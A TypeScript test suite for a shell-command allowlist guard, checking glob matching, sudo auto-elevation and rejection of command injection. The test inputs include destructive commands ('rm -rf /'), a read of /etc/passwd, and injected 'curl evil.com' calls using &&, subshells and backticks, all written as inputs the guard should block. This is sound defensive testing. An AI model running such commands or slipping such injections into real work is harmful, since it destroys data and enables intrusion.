/**
 * CommandAllowlist tests
 */

import { CommandAllowlist, AllowlistConfig } from '../src/guards/command-allowlist';

describe('CommandAllowlist', () => {
  const defaultConfig: AllowlistConfig = {
    enabled: true,
    commands: [
      'tailscale status',
      'tailscale ip *',
      'systemctl --user status *',
      'apt list --installed',
    ],
    elevate: [
      'sudo tailscale *',
      'sudo systemctl restart openclaw-*',
      'sudo systemctl status openclaw-*',
    ],
  };

  describe('command matching', () => {
    it('should match exact commands', () => {
      const al = new CommandAllowlist(defaultConfig);
      const result = al.check('tailscale status');
      expect(result.allowed).toBe(true);
      expect(result.autoElevate).toBe(false);
      expect(result.matchedPattern).toBe('tailscale status');
    });

    it('should match glob patterns', () => {
      const al = new CommandAllowlist(defaultConfig);
      const result = al.check('tailscale ip -4');
      expect(result.allowed).toBe(true);
      expect(result.autoElevate).toBe(false);
    });

    it('should match systemctl user status with any service', () => {
      const al = new CommandAllowlist(defaultConfig);
      const result = al.check('systemctl --user status openclaw-gateway');
      expect(result.allowed).toBe(true);
    });

    it('should reject commands not in allowlist', () => {
      const al = new CommandAllowlist(defaultConfig);
      const result = al.check('rm -rf /');
      expect(result.allowed).toBe(false);
      expect(result.autoElevate).toBe(false);
      expect(result.matchedPattern).toBeUndefined();
    });

    it('should reject partial matches', () => {
      const al = new CommandAllowlist(defaultConfig);
      // "tailscale status" is allowed, but not "tailscale status && rm -rf /"
      // Actually, "tailscale status && rm -rf /" DOES match "tailscale status" + extra.
      // But "tailscale status" is an exact match, so the glob won't catch the injected part.
      // Let me check: the pattern is "tailscale status" → regex is /^tailscale status$/i
      // "tailscale status && rm -rf /" won't match because of the extra chars.
      const result = al.check('tailscale status && rm -rf /');
      expect(result.allowed).toBe(false);
    });

    it('should be case-insensitive', () => {
      const al = new CommandAllowlist(defaultConfig);
      const result = al.check('Tailscale Status');
      expect(result.allowed).toBe(true);
    });

    it('should trim whitespace', () => {
      const al = new CommandAllowlist(defaultConfig);
      const result = al.check('  tailscale status  ');
      expect(result.allowed).toBe(true);
    });
  });

  describe('auto-elevation', () => {
    it('should auto-elevate sudo commands in elevate list', () => {
      const al = new CommandAllowlist(defaultConfig);
      const result = al.check('sudo tailscale up');
      expect(result.allowed).toBe(true);
      expect(result.autoElevate).toBe(true);
      expect(result.matchedPattern).toBe('sudo tailscale *');
    });

    it('should auto-elevate sudo systemctl restart for openclaw services', () => {
      const al = new CommandAllowlist(defaultConfig);
      const result = al.check('sudo systemctl restart openclaw-gateway');
      expect(result.allowed).toBe(true);
      expect(result.autoElevate).toBe(true);
    });

    it('should auto-elevate sudo systemctl status for openclaw services', () => {
      const al = new CommandAllowlist(defaultConfig);
      const result = al.check('sudo systemctl status openclaw-node');
      expect(result.allowed).toBe(true);
      expect(result.autoElevate).toBe(true);
    });

    it('should not auto-elevate non-elevate commands', () => {
      const al = new CommandAllowlist(defaultConfig);
      const result = al.check('tailscale status');
      expect(result.allowed).toBe(true);
      expect(result.autoElevate).toBe(false);
    });

    it('should not auto-elevate arbitrary sudo commands', () => {
      const al = new CommandAllowlist(defaultConfig);
      const result = al.check('sudo rm -rf /');
      expect(result.allowed).toBe(false);
      expect(result.autoElevate).toBe(false);
    });

    it('should not auto-elevate sudo systemctl for non-openclaw services', () => {
      const al = new CommandAllowlist(defaultConfig);
      const result = al.check('sudo systemctl restart nginx');
      expect(result.allowed).toBe(false);
    });
  });

  describe('security: command injection prevention', () => {
    it('should reject piped commands even if prefix matches', () => {
      const al = new CommandAllowlist(defaultConfig);
      expect(al.check('tailscale status | cat /etc/passwd').allowed).toBe(false);
    });

    it('should reject chained commands with &&', () => {
      const al = new CommandAllowlist(defaultConfig);
      expect(al.check('tailscale status && curl evil.com').allowed).toBe(false);
    });

    it('should reject chained commands with ;', () => {
      const al = new CommandAllowlist(defaultConfig);
      expect(al.check('tailscale status; rm -rf /').allowed).toBe(false);
    });

    it('should reject subshell injection', () => {
      const al = new CommandAllowlist(defaultConfig);
      expect(al.check('tailscale status $(curl evil.com)').allowed).toBe(false);
    });

    it('should reject backtick injection', () => {
      const al = new CommandAllowlist(defaultConfig);
      expect(al.check('tailscale status `curl evil.com`').allowed).toBe(false);
    });
  });

  describe('disabled allowlist', () => {
    it('should reject everything when disabled', () => {
      const al = new CommandAllowlist({
        enabled: false,
        commands: ['tailscale status'],
        elevate: ['sudo tailscale *'],
      });
      expect(al.check('tailscale status').allowed).toBe(false);
      expect(al.check('sudo tailscale up').allowed).toBe(false);
    });
  });

  describe('runtime update', () => {
    it('should update commands at runtime', () => {
      const al = new CommandAllowlist(defaultConfig);
      expect(al.check('docker ps').allowed).toBe(false);

      al.update({ commands: [...defaultConfig.commands, 'docker ps'] });
      expect(al.check('docker ps').allowed).toBe(true);
    });

    it('should update elevate list at runtime', () => {
      const al = new CommandAllowlist(defaultConfig);
      expect(al.check('sudo docker restart myapp').autoElevate).toBe(false);

      al.update({ elevate: [...defaultConfig.elevate, 'sudo docker restart *'] });
      const result = al.check('sudo docker restart myapp');
      expect(result.autoElevate).toBe(true);
    });

    it('should disable at runtime', () => {
      const al = new CommandAllowlist(defaultConfig);
      expect(al.check('tailscale status').allowed).toBe(true);

      al.update({ enabled: false });
      expect(al.check('tailscale status').allowed).toBe(false);
    });
  });

  describe('edge cases', () => {
    it('should handle empty commands list', () => {
      const al = new CommandAllowlist({
        enabled: true,
        commands: [],
        elevate: [],
      });
      expect(al.check('anything').allowed).toBe(false);
    });

    it('should handle empty command input', () => {
      const al = new CommandAllowlist(defaultConfig);
      expect(al.check('').allowed).toBe(false);
    });

    it('should handle glob-only patterns', () => {
      const al = new CommandAllowlist({
        enabled: true,
        commands: ['*'],
        elevate: [],
      });
      // WARNING: '*' matches everything — this is intentional but dangerous
      expect(al.check('literally anything').allowed).toBe(true);
    });
  });
});
